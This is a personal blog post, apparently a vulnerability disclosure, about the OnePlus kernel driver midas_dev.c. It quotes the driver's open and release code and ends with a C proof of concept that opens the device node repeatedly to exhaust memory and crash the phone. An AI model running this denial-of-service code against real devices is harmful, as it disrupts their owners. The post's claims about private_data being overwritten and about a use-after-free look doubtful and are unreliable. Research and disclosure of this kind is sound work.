<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Oneplus kernel memory leak and potential use after free :: IamAlch3mist blogs</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="heh" />
<meta name="keywords" content=", " />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://IamAlch3mist.github.io/posts/oneplus_kernel_uaf_memoryleak/" />






  
  
  
  
  
  <link rel="stylesheet" href="https://IamAlch3mist.github.io/styles.css">







  <link rel="shortcut icon" href="https://IamAlch3mist.github.io/img/theme-colors/purple.png">
  <link rel="apple-touch-icon" href="https://IamAlch3mist.github.io/img/theme-colors/purple.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Oneplus kernel memory leak and potential use after free">
<meta property="og:description" content="heh" />
<meta property="og:url" content="https://IamAlch3mist.github.io/posts/oneplus_kernel_uaf_memoryleak/" />
<meta property="og:site_name" content="IamAlch3mist blogs" />

  
  
  <meta property="og:image" content="https://IamAlch3mist.github.io/">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2025-09-28 03:07:44 &#43;0530 IST" />












</head>
<body class="purple">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="https://IamAlch3mist.github.io/">
  <div class="logo">
    Terminal
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about/">`whoami`</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about/" >`whoami`</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://IamAlch3mist.github.io/posts/oneplus_kernel_uaf_memoryleak/">Oneplus kernel memory leak and potential use after free</a>
  </h1>
  <div class="post-meta"><time class="post-date">2025-09-28</time><span class="post-author">IamAlch3mist</span><span class="post-reading-time">2 min read (417 words)</span></div>

  
    <span class="post-tags">
      
      #<a href="https://IamAlch3mist.github.io/tags/use-after-free/">use-after-free</a>&nbsp;
      
      #<a href="https://IamAlch3mist.github.io/tags/memory-leak/">memory-leak</a>&nbsp;
      
      #<a href="https://IamAlch3mist.github.io/tags/kernel-exploit/">kernel-exploit</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <p>I borrowed a OnePlus phone from a friend to experiment with the kernel. Since the kernel is open source, I started digging (hoping for an LPE). I found a couple more bugs they are for another blog post, but here’s a neat little memory leak that can be abused for DoS and can lead to use‑after‑free.</p>
<p>I focused on vendor-specific drivers rather than the <a href="https://github.com/OnePlusOSS/android_kernel_oneplus_mt6893">mainline kernel</a>. The driver in question is: <a href="https://github.com/OnePlusOSS/android_kernel_oneplus_mt6893/blob/oneplus/MT6893_R_11.0/drivers/soc/oplus/midas/midas_dev.c"><code>drivers/soc/oplus/midas/midas_dev.c</code></a></p>
<p>The driver exports the usual file operations with callbacks to open, close, mmap, and ioctl.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> file_operations midas_dev_fops <span style="color:#f92672">=</span> {
	.open <span style="color:#f92672">=</span> midas_dev_open,
	.release <span style="color:#f92672">=</span> midas_dev_release,
	.mmap <span style="color:#f92672">=</span> midas_dev_mmap,
	.unlocked_ioctl <span style="color:#f92672">=</span> midas_dev_ioctl,
};
</code></pre></div><p>On open the driver an allocation happens using kzalloc with the size of struct midas_priv_info and stored in the pointer info. At 2 the allocated info is stored in privat_data member of filp struct which is basically a void pointer.</p>
<p>On close the info pointer is retrieved from the filp struct and passed to kfree.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">midas_dev_open</span>(<span style="color:#66d9ef">struct</span> inode <span style="color:#f92672">*</span>inode, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>filp)
{
	<span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

	<span style="color:#66d9ef">struct</span> midas_priv_info <span style="color:#f92672">*</span>info <span style="color:#f92672">=</span> kzalloc(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> midas_priv_info), GFP_KERNEL); <span style="color:#75715e">// [1]  
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (IS_ERR_OR_NULL(info))
		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOMEM;

	info<span style="color:#f92672">-&gt;</span>mmap_addr <span style="color:#f92672">=</span> vmalloc_user(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> midas_mmap_data));
	<span style="color:#66d9ef">if</span> (IS_ERR_OR_NULL(info<span style="color:#f92672">-&gt;</span>mmap_addr)) {
		pr_err(<span style="color:#e6db74">&#34;mmap_addr vmalloc failed!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
		ret <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>ENOMEM;
		<span style="color:#66d9ef">goto</span> err_info_alloc;
	}

	filp<span style="color:#f92672">-&gt;</span>private_data <span style="color:#f92672">=</span> info; <span style="color:#75715e">// [2]
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;

err_info_alloc:
	kfree(info);
	<span style="color:#66d9ef">return</span> ret;
}


<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">midas_dev_release</span>(<span style="color:#66d9ef">struct</span> inode <span style="color:#f92672">*</span>inode, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>filp)
{
	<span style="color:#66d9ef">struct</span> midas_priv_info <span style="color:#f92672">*</span>info <span style="color:#f92672">=</span> filp<span style="color:#f92672">-&gt;</span>private_data;
	<span style="color:#66d9ef">if</span> (IS_ERR_OR_NULL(info))
		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;

	<span style="color:#66d9ef">if</span> (info<span style="color:#f92672">-&gt;</span>mmap_addr <span style="color:#f92672">!=</span> NULL)
		vfree(info<span style="color:#f92672">-&gt;</span>mmap_addr);

	kfree(info); <span style="color:#75715e">// use after free
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>There are no locks or checks on in the filp-&gt;private_data. If the driver is opened multiple times (without properly closing prior handles). The filp-&gt;private_data pointer can be overwritten with a newly allocated info. Which results in memory leak.</p>
<p>On close the allocated memory is freed but file-&gt;private data holds reference to the info pointer and didn&rsquo;t set to NULL. Combined with the ability to open the driver multiple times leading to potential use-after-free.</p>
<p>system user have permision to interact with the driver.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#ae81ff">OP515BL1:/data/local/tmp</span> <span style="color:#75715e"># ls -al /dev/midas_dev</span>
<span style="color:#ae81ff">crw-rw---- 1 system system 238,   0 2025-09-28 04:53 /dev/midas_dev</span>
</code></pre></div><p>Poc to crash the device using the memory leak.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// aarch64-linux-gnu-gcc -static poc.c 
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {

    <span style="color:#66d9ef">int</span> fd;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xffffff</span>; i<span style="color:#f92672">++</span>) {
    fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/midas_dev&#34;</span>, O_RDWR);
    <span style="color:#66d9ef">if</span> (fd <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
        perror(<span style="color:#e6db74">&#34;open failed&#34;</span>);
        <span style="color:#66d9ef">continue</span>;
    }

}
    close(fd);

<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div>
<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/kzA2Qn1aQik" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<h1 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>I expected good quality from oneplus it was disappointing to see such bugs. In the end I found couple more uaf.</p>

      </div></div>

  
    
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h"></span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        
        <span class="button next">
            <a href="https://IamAlch3mist.github.io/posts/mhl_android_kernel_writeup/">
                <span class="button__text">mobilehackinglab: android kernel writeup</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
